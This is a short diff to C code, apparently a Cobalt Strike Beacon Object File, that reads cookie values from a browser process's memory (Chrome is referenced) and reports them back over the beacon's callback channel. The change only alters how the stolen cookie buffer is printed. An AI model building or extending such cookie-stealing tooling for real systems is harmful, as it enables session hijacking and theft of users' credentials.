@@ -233,7 +233,7 @@ extern "C" {
         BeaconPrintf(CALLBACK_OUTPUT, "Attempting to read cookie values from address:  0x%p\n", (void*)node.valueAddress);
 #endif
         ProcessNodeValue(hProcess, node.valueAddress, buffer, isChrome);
-        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(buffer, bufsize));
+        BeaconOutput(CALLBACK_OUTPUT, BeaconFormatToString(buffer, bufsize), *bufsize);
 
         //Process the left child if it exists
         if (node.left != 0) {
